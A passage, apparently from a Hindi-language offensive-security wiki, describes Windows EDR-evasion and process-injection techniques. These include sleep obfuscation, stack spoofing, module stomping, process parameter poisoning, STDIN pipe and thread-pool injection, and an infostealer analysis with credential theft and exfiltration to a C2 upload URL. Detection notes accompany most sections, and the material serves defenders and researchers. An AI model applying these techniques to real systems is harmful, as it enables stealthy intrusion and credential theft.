- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (उदा., TitanLdr, AceLdr)
- Memory masking hooks (उदा., simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (उदा., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO के ज़रिए import-time IAT hooks

यदि आपका reflective loader पर नियंत्रण है, तो `ProcessImports()` के दौरान loader के `GetProcAddress` pointer को ऐसे custom resolver से बदलकर imports hook कर सकते हैं जो पहले hooks जाँचता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएँ, जो transient loader PIC के स्वयं को free करने के बाद भी बना रहे।
- `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (उदा., `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup इस्तेमाल करें। यदि कोई hook मौजूद हो, तो उसे लौटाएँ; अन्यथा वास्तविक `GetProcAddress` को call करें।
- Crystal Palace के `addhook "MODULE$Func" "hook"` entries के ज़रिए link time पर hook targets register करें। Hook वैध रहता है, क्योंकि वह resident PICO के भीतर होता है।

इससे loaded DLL के code section को load के बाद patch किए बिना **import-time IAT redirection** संभव होता है।

### जब target PEB-walking का उपयोग करता हो, तो hookable imports को बाध्य करना

Import-time hooks तभी सक्रिय होते हैं जब function वास्तव में target के IAT में हो। यदि कोई module PEB-walk + hash के ज़रिए APIs resolve करता है (और कोई import entry नहीं होती), तो वास्तविक import जोड़ें ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (उदा., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve किए जाने पर interception संभव होता है।

### `Sleep()` patch किए बिना Ekko-शैली का sleep/idle obfuscation

`Sleep` को patch करने के बजाय, implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। लंबे waits के लिए, idle के दौरान in-memory image को encrypt करने वाली Ekko-शैली की obfuscation chain में call को wrap करें:<sup>[[31]](#references)[[27]](#references)</sup>

- callbacks का क्रम schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करें।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर सेट करें → पूरी mapped image पर `advapi32!SystemFunction032` के ज़रिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections पर चलकर **प्रति-section permissions बहाल करें** → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; इसे कई frames में clone करें और हर चरण invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) सेट करें।

ऑपरेशनल विवरण: लंबे waits के लिए “success” लौटाएँ (उदा., `WAIT_OBJECT_0`), ताकि image masked रहने के दौरान caller आगे बढ़े। यह तरीका idle windows के दौरान module को scanners से छिपाता है और “patched `Sleep()`” के पारंपरिक signature से बचता है।

Detection के विचार (telemetry-आधारित)
- `NtContinue` की ओर संकेत करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- बड़े contiguous, image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- बड़े-range वाले `VirtualProtect` के बाद custom प्रति-section permission restoration।

### Sleep-obfuscation gadgets के लिए runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget पर पहला indirect jump आमतौर पर `STATUS_STACK_BUFFER_OVERRUN` के साथ process को crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes के भीतर Ekko/Kraken-शैली की chains को चालू रखने के लिए:<sup>[[30]](#references)</sup>

- Chain द्वारा उपयोग किए गए हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries से register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के भीतर के addresses के लिए, `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **पूरी image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए, इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget ही नहीं, बल्कि indirect रूप से पहुँचे exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और attacker-controlled executable sections को भी mark करें, जो indirect targets बनेंगे।

इससे ROP/JOP-शैली की sleep chains “केवल non-CFG processes में काम करती हैं” से बदलकर `/guard:cf` के साथ compiled `explorer.exe`, browsers, `svchost.exe` और अन्य endpoints के लिए reusable primitive बन जाती हैं।

### सोते हुए threads के लिए CET-safe stack spoofing

पूरा `CONTEXT` बदलना शोर पैदा करता है और CET Shadow Stack systems पर विफल हो सकता है, क्योंकि spoofed `Rip` का hardware shadow stack से मेल खाना ज़रूरी है। Sleep-masking का अधिक सुरक्षित तरीका है:<sup>[[30]](#references)</sup>

- उसी process में किसी दूसरे thread को चुनें और `NtQueryInformationThread` के ज़रिए उसकी `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- मौजूदा thread के असली TEB/TIB का backup लें।
- `GetThreadContext` से सो रहे thread का वास्तविक context capture करें।
- Spoof context में **केवल** वास्तविक `Rip` copy करें और spoofed `Rsp`/stack state को जस का तस रखें।
- Sleep window के दौरान spoof thread का `NT_TIB` मौजूदा TEB में copy करें, ताकि stack walkers किसी वैध stack range के भीतर unwind करें।
- Wait समाप्त होने के बाद मूल TIB और thread context restore करें।

इससे CET-संगत instruction pointer बना रहता है, जबकि उन EDR stack walkers को भ्रमित किया जाता है जो unwinds की पुष्टि के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-आधारित विकल्प: Kraken Mask

यदि timer-queue dispatch का signature बहुत पहचाने जाने योग्य हो, तो यही sleep-encrypt-spoof-restore क्रम queued APCs के ज़रिए suspended helper thread से चलाया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाला helper thread बनाएँ।
- `NtQueueApcThread` से तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack को खत्म होने से बचाने के लिए chain state को helper stack के बजाय heap पर रखें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा आधी-restored stack पकड़े जाने की race window कम हो।

इससे `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature आता है, जबकि RC4 masking और stack-spoofing के लक्ष्य समान रहते हैं।

अतिरिक्त detection के विचार
- Sleeps, waits या APC dispatch से कुछ ही पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory` का उपयोग।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास `GetThreadContext`/`SetThreadContext` का उपयोग।
- `NtQueryInformationThread` के बाद मौजूदा thread की TEB/TIB stack bounds में सीधे writes।
- `NtQueueApcThread`/`NtAlertResumeThread` की ऐसी chains जो अप्रत्यक्ष रूप से `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुँचती हों।
- Signed modules के भीतर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसे छोटे gadget signatures का बार-बार उपयोग।


## Precision Module Stomping

Module stomping, स्पष्ट private executable memory allocate करने या नई sacrificial DLL load करने के बजाय, payloads को **target process के भीतर पहले से mapped DLL के `.text` section से** execute करता है। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space payload को समायोजित कर सके और process के लिए अब भी आवश्यक code paths को corrupt न करे।<sup>[[1]](#references)[[2]](#references)</sup>

### भरोसेमंद target चुनना

`uxtheme.dll` या `comctl32.dll` जैसे आम modules पर भोला stomping करना नाज़ुक होता है: DLL remote process में लोड न हो सकती है, और code region बहुत छोटा होने पर process crash हो सकता है। अधिक भरोसेमंद workflow यह है:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल names वाली include list** रखें।
2. पहले payload बनाएँ और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से अधिक महत्वपूर्ण है, क्योंकि यह executable section के **memory में map होने पर** उसके आकार को दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp के शुरुआती offset के रूप में किसी exported function का RVA चुनें।
5. **blast radius** की गणना करें: यदि payload चुने गए function की सीमा से बड़ा है, तो वह memory में उसके बाद रखे गए आस-पास के exports को overwrite करेगा।

जंगली परिवेश में देखे गए सामान्य recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

ऑपरेशनल नोट्स
- Remote process में पहले से **loaded** DLLs को प्राथमिकता दें, ताकि `LoadLibrary`/unexpected image loads की telemetry से बचा जा सके।
- ऐसे exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करता हो; अन्यथा सामान्य code paths, thread creation से पहले या बाद में stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए, अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना पड़ता है, ताकि injector source में पूरा buffer सही तरह दर्शाया जा सके।

Detection के विचार
- अधिक सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
- ऐसे remote threads या context pivots जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके शुरुआती bytes में हाल ही में बदलाव किया गया हो।
- DLL `.text` pages पर संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows, `CreateProcessW` के चुने हुए startup parameters को child process में **copy** करता है और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) में संग्रहीत करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` द्वारा copy किए जाने वाले poisonable carriers

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

व्यावहारिक carrier सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और यह null terminator सहित अधिकतम **32,767 Unicode characters** तक सीमित है।
- `lpEnvironment` एक Unicode environment block होना चाहिए, जिसमें लगातार `NAME=VALUE\0` strings हों और अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक रूप से reserved है, इसलिए `ShellInfo` mapping को स्थिर, documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** बन जाता है। Operator, attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना remote lookup flow

Child बनने के बाद, **read-only** primitives से copied buffer का पता लगाएँ:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` को follow करें
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने गए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए पैरामीटर बफ़र को एक्ज़ीक्यूट करना

कॉपी किया गया पैरामीटर क्षेत्र आमतौर पर `RW` होता है, executable नहीं। एक आम P3 chain यह है:

1. प्रोसेस को सामान्य रूप से बनाएँ (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए पैरामीटर पेज को executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का फिर से उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) से execution को redirect करें

क्लासिक thread hijacking workflows के विपरीत, इसमें **`SuspendThread` / `ResumeThread` की ज़रूरत नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर मॉनिटर किए जाने वाले कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` से भी

### Null-byte की सीमा और staged shellcode

तीनों carriers **string या string-जैसे डेटा** हैं, इसलिए `0x00` वाला raw payload ट्रांसफ़र के दौरान truncate हो जाता है। इसका एक व्यावहारिक workaround है **null-free first stage**, जो runtime पर constants को फिर से बनाता है और फिर कोई भी arbitrary second stage load करता है।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

इससे first stage, transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बना सकता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो वह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से उसका protection `PAGE_EXECUTE_READ` में बदला जा सकता है और उस पर jump किया जा सकता है—इस तरह सीधे RWX allocation से बचा जा सकता है।

### Detection के विचार

लेखकों द्वारा बताए गए अच्छे hunting opportunities:

- `VirtualProtectEx` / `NtProtectVirtualMemory` से **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread का इस्तेमाल
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` को remote reads से पढ़ना
- process creation के दौरान असामान्य रूप से लंबी / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूरा execution primitive नहीं: copied parameter को अब भी execute-permission change और execution redirection method की ज़रूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया था, लेकिन इसे इसलिए छोड़ दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives तक पहुँचता है।

Thread descriptions के ज़रिए किसी **मौजूदा** Windows process में payload delivery, और उसके बाद waiting-thread return-address hijacking के लिए, [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) देखें।

## Console STDIN pipe injection

एक interactive console child को **payload-transfer primitive** के रूप में भी इस्तेमाल किया जा सकता है। Injector, child के standard input को pipe पर redirect करता है और marker के बाद shellcode भेजता है। Console program द्वारा data को अपनी private memory में पढ़ लेने के बाद, injector उस buffer को ढूँढ़ता है, उसे executable बनाता है और child thread को उस पर redirect करता है। इससे `VirtualAllocEx` और `WriteProcessMemory` से बचा जा सकता है, लेकिन यह अब भी process injection है, कोई general EDR bypass नहीं।<sup>[[41]](#references)</sup>

"named-pipe" विवरण के बावजूद, reference implementation `CreatePipe` call करता है, जो एक **anonymous pipe** बनाता है। Windows anonymous pipes को internally uniquely named pipe objects से implement करता है, लेकिन PoC न तो `\\.\pipe\<name>` path चुनता है, न `CreateNamedPipe` call करता है। यह default security descriptor के साथ inheritable handles बनाता है, read handle को `STARTUPINFO.hStdInput` में रखता है, `STARTF_USESTDHANDLES` set करता है और handle inheritance enabled करके एक नया child launch करता है। इसलिए, यह PoC दिया गया console executable launch करता है; यह अपने pipe को किसी मौजूदा process से attach नहीं करता।<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Reference workflow

Implementation यह chain इस्तेमाल करता है:<sup>[[41]](#references)</sup>

1. Child के `STDIN` और `STDOUT` के लिए anonymous pipe pairs बनाएँ। Parent-side के दोनों handles पर inheritance clear करें और process creation के बाद parent में child-side duplicates बंद कर दें।
2. `CREATE_NEW_CONSOLE` के साथ `netsh.exe` या `nslookup.exe` जैसा interactive executable launch करें। Child redirected standard handles inherit करता है।
3. Parent-side `STDIN` handle के ज़रिए `WriteFile` से पूरा binary `rawData` array भेजें। Console program bytes को consume करता है और अपनी private committed regions में से किसी एक में उनकी copy छोड़ देता है।
4. `VirtualQueryEx` से child के address space को traverse करें, `ReadProcessMemory` से candidate `MEM_PRIVATE` regions पढ़ें और `rawData` की शुरुआत में marker खोजें।
5. `VirtualProtectEx` से मिले हुए buffer को `PAGE_EXECUTE_READWRITE` में बदलें।
6. Main thread की पहचान करें, उसे suspend करें, `NtSetContextThread` से `RIP` को `found_address + 0x19` पर set करें और उसे resume करें।

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

दिया गया implementation x64-specific है: यह `CONTEXT.Rip` को संशोधित करता है, और इसमें embedded payload x64 shellcode है। `rawData` की शुरुआत 25-byte marker से होती है, इसलिए executable bytes hexadecimal offset `0x19` से शुरू होते हैं। Payload बदलते समय उस layout को बनाए रखें, या marker, search vector, array size और execution offset को एक साथ अपडेट करें। Source comments में `0x0A`, `0x0D` और `0x1A` को bad characters भी बताया गया है। यह workflow child के token या privileges को नहीं बदलता।<sup>[[41]](#references)</sup>

छोटे native helpers और payload compilation patterns के लिए [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) देखें।

## shellcode के बिना Thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty-शैली की thread-pool injection को इस तरह अपनाता है कि मौजूदा target worker injected callback stub execute करने के बजाय `LoadLibraryA` call करे। इसका dispatch primitive target pool के I/O completion port पर queued `TP_DIRECT` completion है। यह process permissions को bypass नहीं करता: PoC `OpenProcess(PROCESS_ALL_ACCESS)` call करता है और इसके लिए readable/writable target memory के साथ duplicable worker-factory और completion-port handles की आवश्यकता होती है।<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64 पर worker, stack-backed `TP_CALLBACK_INSTANCE` का pointer `RCX` में देता है, जो पहला callback argument है। `LoadLibraryA` उसी pointer को `LPCSTR` के रूप में समझता है। परीक्षण किए गए path में, `TppWorkerThread` pointer को `RSP+0x178` पर बनाता है, जबकि उस object में उसका पहला सामान्य write `RSP+0x1d0` पर होता है। इसलिए, null-terminated DLL path जो इस 0x58-byte prefix में फिट हो, instance की शुरुआत में रखी जा सकती है और dispatch से पहले overwrite नहीं होगी। यह किसी खास build का अवलोकन है, Windows ABI की documented guarantee नहीं।<sup>[[46]](#references)[[47]](#references)</sup>

Reference workflow यह है:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` से target के handles enumerate करें और object types query करके `TpWorkerFactory` पहचानें। Worker-factory handle duplicate करें और `WorkerFactoryBasicInformation` query करें; `StartParameter` से remote `TP_POOL` मिलता है। `TotalWorkerCount == 0` वाले factories छोड़ दें।
2. `TP_POOL.CompletionPort` पढ़ें और pool की private worker list को traverse करें। परीक्षण किए गए Windows 10 19045 x64 build (`ntdll.dll 10.0.19041.4842`) पर, इसका head `pool+0x60` पर है; हर link `worker+0x10` पर है, इसलिए `worker+0x38` पर callback-instance slot, `link+0x28` के बराबर है। PoC pointer alignment, link reciprocity, pool ownership, nonzero thread IDs, repeated nodes और stable list head की जाँच करता है।
3. DLL path को मिले **हर** worker slot में लिखें, क्योंकि queued completion को कोई भी worker consume कर सकता है। Writable target memory में `Callback = LoadLibraryA` वाला `TP_DIRECT` रखें। PoC `VirtualAllocEx` के बजाय worker stack पर `last_slot-0x500` का उपयोग करता है; यह offset experimental है और active stack data से नहीं टकराना चाहिए।
4. Target completion-port handle duplicate करें और `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` call करें। Remote `TP_DIRECT` address completion key होता है। फिर मौजूदा worker, overwritten callback-instance pointer के साथ `LoadLibraryA` invoke करता है और target के लिए पहले से accessible DLL load करता है।

PoC, target PID (`DLLParty.exe <target_pid>`) लेता है और `DLLParty.cpp` में hard-coded DLL path इस्तेमाल करता है; x64 executable बनाने से पहले target के लिए accessible path सेट करें। यह remote callback के रूप में अपने process के `LoadLibraryA` address का भी उपयोग करता है, इसलिए यह मानता है कि वह address target में valid है। Code, path length को 0x58-byte prefix से नहीं जाँचता और न ही यह जाँचता है कि worker traversal को last element index करने से पहले कोई slot मिला था। Target build के लिए private offsets, stack layout और writable space को फिर से validate करें। `CreateRemoteThreadEx`, shellcode और `VirtualAllocEx` का उपयोग न करने से cross-process writes या DLL-load telemetry समाप्त नहीं होते।<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless evasion और credential theft के लिए SantaStealer Tradecraft

SantaStealer (aka BluelineStealer) दिखाता है कि आधुनिक info-stealers, AV bypass, anti-analysis और credential access को एक ही workflow में कैसे मिलाते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए installed keyboard layouts enumerate करता है। अगर Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker छोड़ता है और stealers चलाने से पहले terminate हो जाता है। इससे excluded locales पर यह कभी detonate नहीं होता, जबकि hunting artifact बना रहता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### परतदार `check_antivm` logic

- Variant A process list पर चलता है, हर नाम का custom rolling checksum बनाता है और उसे debuggers/sandboxes की embedded blocklists से मिलाता है; यह computer name पर भी checksum दोहराता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties (process-count floor, हाल का uptime) की जाँच करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` कॉल करता है और single-stepping का पता लगाने के लिए sleeps के आसपास timing checks करता है। कोई भी संकेत मिलने पर modules launch होने से पहले प्रक्रिया रोक दी जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे या तो disk पर drop किया जाता है या memory में manually map किया जाता है; fileless mode में यह imports/relocations खुद resolve करता है, इसलिए helper के कोई artifacts नहीं लिखे जाते।
- यह helper ChaCha20 से दो बार encrypted second-stage DLL रखता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, यह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से निकले exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` कॉल करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके किसी live Chromium browser में inject करते हैं, AppBound Encryption keys inherit करते हैं और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करते हैं।

### Modular in-memory collection और chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions आदि) के लिए एक thread शुरू करता है। हर thread shared buffers में results लिखता है और लगभग 45s के join window के बाद अपनी file count बताता है।
- पूरा होने पर, statically linked `miniz` library से सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s तक सोता है और archive को 10 MB chunks में HTTP POST के ज़रिए `http://<C2>:6767/upload` पर stream करता है, साथ ही browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) को spoof करता है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` शामिल होते हैं, और आखिरी chunk में `complete: true` जोड़ा जाता है ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
